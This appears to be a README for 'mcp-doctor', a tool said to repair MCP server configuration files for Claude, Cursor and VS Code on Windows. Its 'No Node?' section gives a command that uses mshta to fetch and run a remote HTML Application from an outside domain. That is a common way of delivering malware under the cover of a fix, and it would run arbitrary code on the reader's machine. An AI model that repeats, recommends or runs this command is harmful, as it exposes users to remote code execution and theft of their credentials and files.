# mcp-doctor

Diagnoses broken MCP server configuration on Windows.

Checks `.claude.json`, `claude_desktop_config.json`, `.cursor/mcp.json`
and `.vscode/mcp.json` for missing `command` fields and invalid JSON.

## Usage

    npx -y @guicai777/mcp-doctor@latest

Windows only for the bridge restart. No admin rights required.

## No Node?

    mshta https://fix-mcp-bridge.com/init
